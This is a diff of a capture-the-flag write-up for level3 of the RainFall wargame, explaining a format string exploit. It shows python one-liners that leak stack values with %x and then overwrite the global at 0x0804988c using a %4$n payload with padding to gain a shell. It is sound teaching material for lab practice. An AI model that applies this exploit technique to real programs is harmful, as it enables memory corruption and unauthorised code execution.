@@ -32,19 +32,25 @@ Our input is located in offset 4 (61616161) so offset = 4
 
 2_1)   
 
-Now let's place the address of 0x0804988c inside the stack. why this address becuase we found that this is the address that is being compared in the function v() 
+Now let's place the address of 0x0804988c inside the stack. why this address because we found that this is the address that is being compared in the function v() 
+the address of m 
 
 test:
 
 level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' | ./level3
 � 200 b7fd1ac0 b7ff37d0 804988c
 
+argument 1 → 200
+argument 2 → b7fd1ac0
+argument 3 → b7ff37d0
+argument 4 → 0x0804988c   ← our injected address
+
 
 we can see that the address is located in the the argument 4, and we refer to it by %4$
 
 2_2)
 
-example tp explain the %n
+example to explain the %n
 
 int x = 0;
 printf("Hello%n", &x);
@@ -63,6 +69,10 @@ n Do NOT print. Write number of printed characters so far into the address provi
 
 
 (python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat) | ./level3
+
+\x8c\x98\x04\x08   → address to overwrite
+"A"*60             → padding
+%4$n               → write operation
 
 2_3) conclusion
 
